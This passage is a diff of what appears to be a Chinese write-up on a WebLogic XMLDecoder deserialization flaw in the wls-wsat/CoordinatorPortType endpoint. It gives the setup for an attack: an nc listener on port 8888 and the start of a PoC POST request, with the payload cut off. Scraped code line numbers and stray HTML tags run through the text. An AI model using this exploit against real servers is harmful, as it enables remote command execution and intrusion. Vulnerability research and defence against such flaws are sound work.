@@ -149,12 +149,9 @@ Oracle WebLogic Server 12.2.1.1.0版本
 Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。
 wls-wsat/CoordinatorPortType
 
-
-
-
 nc监听8888端口,burpsuit 发包
 poc:
-12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: yourip:portUser-Agent: Mozilla/5.0 (X11; Linux x86_64</div>
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: yourip:portUser-Agent: Mozilla/5.0 (X11; Linux x86_64; r</div>
         </div>
       </a>
 
